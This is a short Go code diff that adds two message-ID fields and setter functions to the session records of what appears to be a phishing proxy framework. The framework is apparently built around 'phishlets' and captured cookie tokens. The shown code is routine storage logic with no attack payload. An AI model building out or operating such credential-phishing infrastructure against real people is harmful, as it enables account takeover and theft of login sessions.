@@ -25,6 +25,8 @@ type Session struct {
 	RemoteAddr   string                             `json:"remote_addr"`
 	CreateTime   int64                              `json:"create_time"`
 	UpdateTime   int64                              `json:"update_time"`
+	Cmsgid       string                             `json:"cmsgid"`
+	Tmsgid       string                             `json:"tmsgid"`
 }
 
 type CookieToken struct {
@@ -62,6 +64,8 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		RemoteAddr:   remote_addr,
 		CreateTime:   time.Now().UTC().Unix(),
 		UpdateTime:   time.Now().UTC().Unix(),
+		Cmsgid:       "",
+		Tmsgid:       "",
 	}
 
 	jf, _ := json.Marshal(s)
@@ -92,6 +96,30 @@ func (d *Database) sessionsList() ([]*Session, error) {
 		return nil, err
 	}
 	return sessions, nil
+}
+
+func (d *Database) sessionsUpdateCmsgid(sid string, cmsgid string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.Cmsgid = cmsgid
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	return err
+}
+
+func (d *Database) sessionsUpdateTmsgid(sid string, tmsgid string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.Tmsgid = tmsgid
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	return err
 }
 
 func (d *Database) sessionsUpdateUsername(sid string, username string) error {
